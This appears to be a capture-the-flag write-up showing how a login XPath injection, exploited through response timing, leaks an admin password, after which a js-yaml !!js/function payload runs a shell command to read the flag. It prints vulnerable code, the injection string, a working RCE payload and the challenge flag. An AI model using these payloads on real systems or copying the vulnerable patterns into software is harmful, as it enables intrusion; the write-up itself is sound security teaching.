1.  **Blind XPath Injection (Timing Attack):**
    The `login` endpoint was vulnerable to XPath injection via the `username` field. The application performed a `setTimeout(..., 2000)` if a user was found, creating a timing oracle. By injecting XPath queries, we could ask true/false questions about the database content based on the response time.
    *   **Vulnerable Code:**
        ```javascript
        const query = `//user[username/text()='${username}']`;
        const userNode = xpath.select(query, xmlDoc)[0];
        if (userNode) { await new Promise(resolve => setTimeout(resolve, 2000)); }
        ```
    *   **Exploit:** We used a script to iterate through characters of the admin's password using the payload `admin' and substring(password, N, 1)='C`. This allowed us to extract the admin password: `df08cf`.

2.  **Remote Code Execution (RCE) via YAML Deserialization:**
    With the admin credentials, we accessed the `/admin/create` endpoint. This endpoint accepted YAML content and parsed it using an outdated and vulnerable version of `js-yaml` (v2.0.4).
    *   **Vulnerable Code:**
        ```javascript
        parsed = yaml.load(fileContent);
        const applied = '' + parsed; 
        ```
    *   **Exploit:** We constructed a malicious YAML payload using the `!!js/function` tag, which allows execution of arbitrary JavaScript code during parsing in this version of `js-yaml`. We used an IIFE (Immediately Invoked Function Expression) to run system commands. Since `require` is not available in the global scope of `new Function`, we accessed it via `process.mainModule.require`.

    **Payload:**
    ```yaml
    !!js/function "function() { var req = process.mainModule.require; var res = req('child_process').execSync('cat flag.txt').toString(); return res; }()"
    ```

**Flag:**
`flag{xPath_to_YamLrc3_ecddd907d5d5decb}`